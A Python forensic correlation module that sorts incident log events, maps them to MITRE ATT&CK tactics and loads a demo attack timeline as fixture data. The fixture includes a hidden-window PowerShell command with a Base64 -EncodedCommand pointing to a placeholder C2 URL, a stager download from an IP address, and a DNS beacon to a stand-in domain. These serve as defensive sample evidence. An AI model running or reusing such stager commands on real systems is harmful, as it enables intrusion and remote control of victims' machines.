import json
from datetime import datetime
from typing import List, Dict, Any

class CorrelationEngine:
    """
    Step 2 & 3: Correlation & Mapping Engine.
    Aligns timestamps, resolves entities across disparate log files, and maps to MITRE ATT&CK matrix.
    """
    def __init__(self):
        self.master_timeline: List[Dict[str, Any]] = []

    def add_events(self, events: List[Dict[str, Any]]):
        self.master_timeline.extend(events)
        self.sort_timeline()

    def sort_timeline(self):
        """Microsecond UTC timestamp alignment."""
        def parse_ts(item):
            ts = item.get("timestamp_utc", "")
            try:
                return datetime.fromisoformat(ts.replace("Z", "+00:00"))
            except Exception:
                return datetime.min

        self.master_timeline.sort(key=parse_ts)

    def get_unified_timeline(self) -> List[Dict[str, Any]]:
        return self.master_timeline

    def load_demo_scenario(self) -> Dict[str, Any]:
        """
        SUTRAM 2026 Master Demonstration Attack Flow:
        Reconstructs the full 4-stage cyber incident timeline.
        """
        demo_events = [
            {
                "event_id": "EVT-001",
                "timestamp_utc": "2026-09-29T10:13:30.000000Z",
                "source": "Browser History SQLite (Chrome)",
                "artifact": "History.sqlite",
                "evidence_id": "EVD-A912F4",
                "category": "INITIAL_ACCESS",
                "user": "SYSTEM_ADMIN",
                "ip_address": "192.168.1.105",
                "description": "User initiated download of file 'stager_update.exe' from http://185.220.101.44/payload.",
                "mitre_id": "T1189",
                "mitre_tactic": "Initial Access",
                "risk_score": "HIGH",
                "entities": ["SYSTEM_ADMIN", "192.168.1.105", "stager_update.exe"]
            },
            {
                "event_id": "EVT-002",
                "timestamp_utc": "2026-09-29T10:14:02.000000Z",
                "source": "Windows Registry SYSTEM Hive (USBSTOR)",
                "artifact": "SYSTEM.hive",
                "evidence_id": "EVD-B771E2",
                "category": "HARDWARE_USB",
                "user": "SYSTEM_ADMIN",
                "device": "Kingston DataTraveler 3.0",
                "serial_number": "AA000000000012948",
                "assigned_drive": "E:",
                "description": "USB Storage Device Attached: Kingston DataTraveler 3.0 (Serial: AA000000000012948) mounted to Drive E:.",
                "mitre_id": "T1091",
                "mitre_tactic": "Initial Access / Replication",
                "risk_score": "HIGH",
                "entities": ["SYSTEM_ADMIN", "Kingston 32GB", "Drive E:"]
            },
            {
                "event_id": "EVT-003",
                "timestamp_utc": "2026-09-29T10:14:20.000000Z",
                "source": "NTFS $UsnJrnl / Shellbags",
                "artifact": "$UsnJrnl",
                "evidence_id": "EVD-C882D1",
                "category": "EXFILTRATION_STAGING",
                "user": "SYSTEM_ADMIN",
                "file_path": "C:\\Users\\Admin\\Documents\\confidential_q3.xlsx",
                "dest_path": "E:\\confidential_q3.xlsx",
                "file_size": "3.8 MB",
                "description": "Sensitive document 'confidential_q3.xlsx' copied from internal filesystem to external USB Drive E:.",
                "mitre_id": "T1052.001",
                "mitre_tactic": "Exfiltration",
                "risk_score": "CRITICAL",
                "entities": ["confidential_q3.xlsx", "Drive E:"]
            },
            {
                "event_id": "EVT-004",
                "timestamp_utc": "2026-09-29T10:15:11.000000Z",
                "source": "Windows Security Event Log (EVTX 4688)",
                "artifact": "Security.evtx",
                "evidence_id": "EVD-D993C0",
                "category": "EXECUTION",
                "user": "SYSTEM_ADMIN",
                "ip_address": "192.168.1.105",
                "process_name": "powershell.exe",
                "command_line": "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand aHR0cHM6Ly9tYWxpY2lvdXMtYzIub3JnL2NvbW1hbmQ=",
                "description": "Powershell process spawned with hidden window and Base64 encoded stager payload.",
                "mitre_id": "T1059.001",
                "mitre_tactic": "Execution / Defense Evasion",
                "risk_score": "CRITICAL",
                "entities": ["powershell.exe", "192.168.1.105"]
            },
            {
                "event_id": "EVT-005",
                "timestamp_utc": "2026-09-29T10:15:45.000000Z",
                "source": "Network PCAP Packet Capture",
                "artifact": "traffic_capture.pcap",
                "evidence_id": "EVD-E004B9",
                "category": "COMMAND_AND_CONTROL",
                "src_ip": "192.168.1.105",
                "dest_ip": "185.220.101.44",
                "domain": "malicious-c2-beacon.darknet.xyz",
                "protocol": "DNS Query / UDP 53",
                "description": "DNS Beacon query sent to malicious C2 server domain 'malicious-c2-beacon.darknet.xyz'.",
                "mitre_id": "T1071.004",
                "mitre_tactic": "Command & Control",
                "risk_score": "HIGH",
                "entities": ["192.168.1.105", "185.220.101.44", "malicious-c2-beacon.darknet.xyz"]
            }
        ]
        self.master_timeline = demo_events
        return {
            "events": demo_events,
            "summary": {
                "incident_name": "USB Data Exfiltration & Encoded PowerShell C2 Beacon",
                "start_time": "2026-09-29T10:13:30.000000Z",
                "end_time": "2026-09-29T10:15:45.000000Z",
                "affected_host": "WORKSTATION-RIG-01 (192.168.1.105)",
                "actor": "SYSTEM_ADMIN",
                "overall_threat_level": "CRITICAL",
                "total_correlated_events": 5,
                "mitre_tactics_triggered": [
                    "Initial Access (T1189)",
                    "Hardware Insertion (T1091)",
                    "Exfiltration via Removable Media (T1052.001)",
                    "PowerShell Encoded Command (T1059.001)",
                    "DNS C2 Beaconing (T1071.004)"
                ]
            }
        }

    def get_mitre_matrix(self, events: List[Dict[str, Any]]) -> Dict[str, List[Dict[str, Any]]]:
        """Categorizes events into standard MITRE ATT&CK tactics."""
        matrix = {
            "Initial Access": [],
            "Execution": [],
            "Persistence": [],
            "Privilege Escalation": [],
            "Defense Evasion": [],
            "Credential Access": [],
            "Discovery": [],
            "Lateral Movement": [],
            "Collection": [],
            "Exfiltration": [],
            "Command & Control": []
        }
        
        for ev in events:
            tactic = ev.get("mitre_tactic", "Execution")
            # Map into bucket
            found = False
            for key in matrix.keys():
                if key.lower() in tactic.lower():
                    matrix[key].append(ev)
                    found = True
                    break
            if not found:
                matrix["Execution"].append(ev)
                
        return matrix
